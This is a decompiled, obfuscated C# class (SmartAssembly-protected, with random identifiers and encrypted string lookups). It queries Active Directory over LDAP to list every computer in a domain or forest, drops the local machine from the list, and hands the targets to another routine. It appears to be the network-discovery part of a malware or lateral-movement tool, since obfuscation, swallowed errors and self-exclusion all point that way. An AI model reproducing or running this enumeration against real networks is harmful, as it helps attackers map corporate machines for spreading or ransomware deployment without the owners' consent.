using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class jswVoEfsIYZT
{
	private static Predicate<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1;

	[NonSerialized]
	internal static GetString getString_0;

	public static void cfDSiMohTNM()
	{
		string[] string_ = new string[2]
		{
			getString_0(107407160),
			getString_0(107407179)
		};
		List<string> list = new List<string>();
		Dictionary<string, string[]> dictionary_ = PZTnpKYTfUuGAQpL.XIaJGmWZjtNeB(string_);
		PZTnpKYTfUuGAQpL.XvdETHknrHYVBv xvdETHknrHYVBv = PZTnpKYTfUuGAQpL.aHrCXALxRlV(dictionary_);
		if (xvdETHknrHYVBv == null || !PZTnpKYTfUuGAQpL.pNIxIiUGWysnCVDe(xvdETHknrHYVBv))
		{
			return;
		}
		if (!string.IsNullOrEmpty(xvdETHknrHYVBv.hgTfgijSALuF))
		{
			List<string> list2 = eowkUMCnRtcrx(xvdETHknrHYVBv);
			if (list2 != null)
			{
				list = list.Concat(list2).ToList();
			}
		}
		if (!string.IsNullOrEmpty(xvdETHknrHYVBv.zkunUNquxzD))
		{
			List<string> list3 = cCPKnaaPxnZohL(xvdETHknrHYVBv);
			if (list3 != null)
			{
				list = list.Concat(list3).ToList();
			}
		}
		list = list.Distinct().ToList();
		hcvldybcVVrE.SVUQZDudIzDWg = list.Count;
		iCscnGQlBeKHP.CdMJoAYaoly(list, xvdETHknrHYVBv);
	}

	public static List<string> eowkUMCnRtcrx(PZTnpKYTfUuGAQpL.XvdETHknrHYVBv xvdETHknrHYVBv_0)
	{
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Expected O, but got Unknown
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_0214: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0224: Expected O, but got Unknown
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_029a: Expected O, but got Unknown
		//IL_037f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Expected O, but got Unknown
		//IL_0388: Unknown result type (might be due to invalid IL or missing references)
		//IL_038f: Expected O, but got Unknown
		//IL_0391: Unknown result type (might be due to invalid IL or missing references)
		//IL_0398: Expected O, but got Unknown
		//IL_039a: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Expected O, but got Unknown
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fc: Expected O, but got Unknown
		try
		{
			bool flag = true;
			List<string> list = new List<string>();
			string text = null;
			string hgTfgijSALuF = xvdETHknrHYVBv_0.hgTfgijSALuF;
			if (hgTfgijSALuF != null)
			{
				if (!(hgTfgijSALuF == getString_0(107407610)))
				{
					if (!(hgTfgijSALuF == getString_0(107407605)))
					{
						if (!(hgTfgijSALuF == getString_0(107407600)))
						{
							if (!(hgTfgijSALuF == getString_0(107407615)))
							{
								if (!(hgTfgijSALuF == getString_0(107407570)))
								{
									goto IL_0499;
								}
								flag = false;
								getString_0(107406118);
								text = getString_0(107406509);
							}
							else
							{
								flag = false;
								getString_0(107406257);
								text = getString_0(107406228);
							}
						}
						else
						{
							getString_0(107406604);
							text = getString_0(107407051);
						}
					}
					else
					{
						getString_0(107406843);
						text = getString_0(107406774);
					}
				}
				else
				{
					getString_0(107407545);
					text = getString_0(107407492);
				}
				if (flag)
				{
					try
					{
						DirectoryEntry val = null;
						DirectorySearcher val2 = null;
						if (!string.IsNullOrEmpty(xvdETHknrHYVBv_0.QGxbCNVMrbq) && !string.IsNullOrEmpty(xvdETHknrHYVBv_0.XaTLiHryhkNmXZh))
						{
							try
							{
								string text2 = string.Format(getString_0(107405711), xvdETHknrHYVBv_0.QGxbCNVMrbq, xvdETHknrHYVBv_0.XaTLiHryhkNmXZh.Replace(getString_0(107411220), getString_0(107405690)));
								val = new DirectoryEntry(text2);
								val2 = new DirectorySearcher(val);
							}
							catch (Exception)
							{
								string text2 = string.Format(getString_0(107405681), xvdETHknrHYVBv_0.QGxbCNVMrbq, xvdETHknrHYVBv_0.XaTLiHryhkNmXZh.Replace(getString_0(107411220), getString_0(107405690)));
								val = new DirectoryEntry(text2);
								val2 = new DirectorySearcher(val);
							}
						}
						else
						{
							Forest currentForest = Forest.GetCurrentForest();
							GlobalCatalog val3 = currentForest.FindGlobalCatalog();
							val2 = ((DomainController)val3).GetDirectorySearcher();
						}
						val2.get_PropertiesToLoad().Add(getString_0(107405656));
						val2.set_Filter(text);
						val2.set_SizeLimit(int.MaxValue);
						val2.set_PageSize(int.MaxValue);
						foreach (SearchResult item2 in val2.FindAll())
						{
							SearchResult val4 = item2;
							try
							{
								string item = val4.get_Properties().get_Item(getString_0(107405656)).get_Item(0)
									.ToString()!.ToUpper();
								list.Add(item);
							}
							catch
							{
							}
						}
						((Component)(object)val2).Dispose();
					}
					catch (Exception)
					{
						if (xvdETHknrHYVBv_0.XqnMckeaPPk)
						{
						}
					}
				}
				else
				{
					try
					{
						DirectoryEntry val = null;
						DirectorySearcher val5 = null;
						if (!string.IsNullOrEmpty(xvdETHknrHYVBv_0.QGxbCNVMrbq) && !string.IsNullOrEmpty(xvdETHknrHYVBv_0.XaTLiHryhkNmXZh))
						{
							string text2 = string.Format(getString_0(107405681), xvdETHknrHYVBv_0.QGxbCNVMrbq, xvdETHknrHYVBv_0.XaTLiHryhkNmXZh.Replace(getString_0(107411220), getString_0(107405690)));
							val = new DirectoryEntry(text2);
							val5 = new DirectorySearcher(val);
						}
						else
						{
							val = new DirectoryEntry();
							val5 = new DirectorySearcher(val);
						}
						val5.get_PropertiesToLoad().Add(getString_0(107405656));
						val5.set_Filter(text);
						val5.set_SizeLimit(int.MaxValue);
						val5.set_PageSize(int.MaxValue);
						foreach (SearchResult item3 in val5.FindAll())
						{
							SearchResult val4 = item3;
							try
							{
								string item = val4.get_Properties().get_Item(getString_0(107405656)).get_Item(0)
									.ToString()!.ToUpper();
								list.Add(item);
							}
							catch
							{
							}
						}
						((Component)(object)val5).Dispose();
					}
					catch (Exception)
					{
						if (xvdETHknrHYVBv_0.XqnMckeaPPk)
						{
						}
					}
				}
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate1 = (string string_0) => string_0.Contains(Environment.MachineName.ToUpper());
				}
				list.RemoveAll(CS_0024_003C_003E9__CachedAnonymousMethodDelegate1);
				return list;
			}
			goto IL_0499;
			IL_0499:
			PZTnpKYTfUuGAQpL.MCMCVbJvqd();
			return null;
		}
		catch (Exception)
		{
			if (!xvdETHknrHYVBv_0.XqnMckeaPPk)
			{
			}
			return null;
		}
	}

	public static List<string> cCPKnaaPxnZohL(PZTnpKYTfUuGAQpL.XvdETHknrHYVBv xvdETHknrHYVBv_0)
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		try
		{
			List<string> list = new List<string>();
			DirectoryEntry val = null;
			DirectorySearcher val2 = null;
			if (!string.IsNullOrEmpty(xvdETHknrHYVBv_0.QGxbCNVMrbq) && !string.IsNullOrEmpty(xvdETHknrHYVBv_0.XaTLiHryhkNmXZh))
			{
				try
				{
					string text = string.Format(getString_0(107405711), xvdETHknrHYVBv_0.QGxbCNVMrbq, xvdETHknrHYVBv_0.XaTLiHryhkNmXZh.Replace(getString_0(107411220), getString_0(107405690)));
					val = new DirectoryEntry(text);
					val2 = new DirectorySearcher(val);
				}
				catch (Exception)
				{
					string text = string.Format(getString_0(107405681), xvdETHknrHYVBv_0.QGxbCNVMrbq, xvdETHknrHYVBv_0.XaTLiHryhkNmXZh.Replace(getString_0(107411220), getString_0(107405690)));
					val = new DirectoryEntry(text);
					val2 = new DirectorySearcher(val);
				}
			}
			else
			{
				string text2 = getString_0(107405671) + xvdETHknrHYVBv_0.zkunUNquxzD;
				val = new DirectoryEntry(text2);
				val2 = new DirectorySearcher(val);
			}
			val2.get_PropertiesToLoad().Add(getString_0(107405656));
			val2.set_Filter(getString_0(107407492));
			val2.set_SizeLimit(int.MaxValue);
			val2.set_PageSize(int.MaxValue);
			foreach (SearchResult item2 in val2.FindAll())
			{
				SearchResult val3 = item2;
				string item = val3.get_Properties().get_Item(getString_0(107405656)).get_Item(0)
					.ToString();
				list.Add(item);
			}
			((Component)(object)val2).Dispose();
			((Component)(object)val).Dispose();
			return list;
		}
		catch (Exception)
		{
			if (!xvdETHknrHYVBv_0.XqnMckeaPPk)
			{
			}
			return null;
		}
	}

	private static bool _003CSearchLDAP_003Eb__0(string string_0)
	{
		return string_0.Contains(Environment.MachineName.ToUpper());
	}

	static jswVoEfsIYZT()
	{
		Strings.CreateGetStringDelegate(typeof(jswVoEfsIYZT));
	}
}
